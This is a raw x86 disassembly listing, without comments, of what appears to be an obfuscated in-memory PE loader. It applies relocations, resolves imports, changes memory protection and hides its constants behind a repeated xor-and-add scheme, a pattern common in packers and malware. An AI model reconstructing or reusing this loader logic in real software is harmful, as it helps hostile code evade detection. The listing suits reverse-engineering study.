  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
